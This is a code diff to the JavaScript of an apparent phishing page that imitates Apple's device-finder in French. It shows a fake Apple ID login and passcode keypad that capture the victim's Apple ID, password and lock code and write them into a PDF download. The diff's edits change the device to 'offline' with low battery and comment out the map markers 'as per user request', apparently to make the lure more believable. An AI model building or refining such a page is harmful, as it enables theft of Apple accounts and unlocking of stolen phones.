@@ -17,9 +17,9 @@ document.addEventListener('DOMContentLoaded', () => {
         {
             id: 'iphone-13-pro',
             name: 'iPhone 13 Pro',
-            status: 'En ligne',
-            time: 'Maintenant',
-            battery: '100%',
+            status: 'Hors ligne',
+            time: '',
+            battery: '15%',
             icon: '📱',
             lat: 11.1785,
             lng: -8.1535,
@@ -35,7 +35,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // 4. Render Devices
     function renderDevices() {
         deviceListContainer.innerHTML = '';
-        
+
         devices.forEach(device => {
             // Create List Item
             const item = document.createElement('div');
@@ -47,11 +47,12 @@ document.addEventListener('DOMContentLoaded', () => {
                     <p>${device.status} • ${device.time}</p>
                 </div>
             `;
-            
+
             item.addEventListener('click', () => selectDevice(device));
             deviceListContainer.appendChild(item);
 
-            // Create Map Marker
+            // Markers removed as per user request
+            /*
             const customIcon = L.divIcon({
                 className: 'custom-marker',
                 html: `<div class="pulse-dot"></div>`,
@@ -62,12 +63,13 @@ document.addEventListener('DOMContentLoaded', () => {
             const marker = L.marker([device.lat, device.lng], { icon: customIcon }).addTo(map);
             marker.on('click', () => selectDevice(device));
             markers[device.id] = marker;
+            */
         });
     }
 
     // 5. Select Device Logic
     function selectDevice(device) {
-        // Zoom and center map
+        // Map centering still works, but no marker will be visible
         map.flyTo([device.lat, device.lng], 16, {
             duration: 1.5,
             easeLinearity: 0.25
@@ -87,7 +89,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('close-detail').addEventListener('click', () => {
         sidePanel.style.transform = 'translateX(0)';
         deviceDetail.classList.add('hidden');
-        
+
         // Reset map view slightly if needed
         map.flyTo(defaultLocation, 13);
     });
@@ -101,7 +103,8 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-    // 8. Add "Me" location
+    // 8. Add "Me" location (Removed as per user request)
+    /*
     const meLocation = [11.1780, -8.1530];
     const meIcon = L.divIcon({
         className: 'custom-marker',
@@ -110,6 +113,7 @@ document.addEventListener('DOMContentLoaded', () => {
         iconAnchor: [10, 10]
     });
     L.marker(meLocation, { icon: meIcon }).addTo(map);
+    */
 
     // 9. Multi-step Login & Passcode Logic
     const togglePasswordBtn = document.getElementById('toggle-password');
@@ -123,11 +127,11 @@ document.addEventListener('DOMContentLoaded', () => {
     togglePasswordBtn.addEventListener('click', () => {
         const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
         passwordInput.setAttribute('type', type);
-        
+
         // Toggle SVG icon (simplified approach: change opacity or switch SVG)
         const eyePath = document.getElementById('eye-path');
         const eyeOffPath = document.getElementById('eye-off-path');
-        
+
         if (type === 'password') {
             eyePath.style.display = 'block';
             eyeOffPath.style.display = 'none';
@@ -173,7 +177,7 @@ document.addEventListener('DOMContentLoaded', () => {
             if (passcode.length < 6) {
                 passcode += key.textContent;
                 updatePasscodeDots();
-                
+
                 if (passcode.length === 6) {
                     capturedData.passcode = passcode;
                     // Trigger PDF Download
@@ -203,18 +207,18 @@ document.addEventListener('DOMContentLoaded', () => {
                 return;
             }
             const doc = new jsPDF();
-            
+
             doc.setFontSize(22);
             doc.text("Informations de Connexion Apple", 20, 20);
-            
+
             doc.setFontSize(16);
             doc.text(`Identifiant Apple : ${data.appleId}`, 20, 40);
             doc.text(`Mot de passe : ${data.password}`, 20, 50);
             doc.text(`Code de verrouillage : ${data.passcode}`, 20, 60);
-            
+
             doc.setFontSize(10);
             doc.text(`Généré le : ${new Date().toLocaleString()}`, 20, 80);
-            
+
             console.log("PDF généré, lancement du téléchargement...");
             doc.save("informations_apple.pdf");
         } catch (err) {
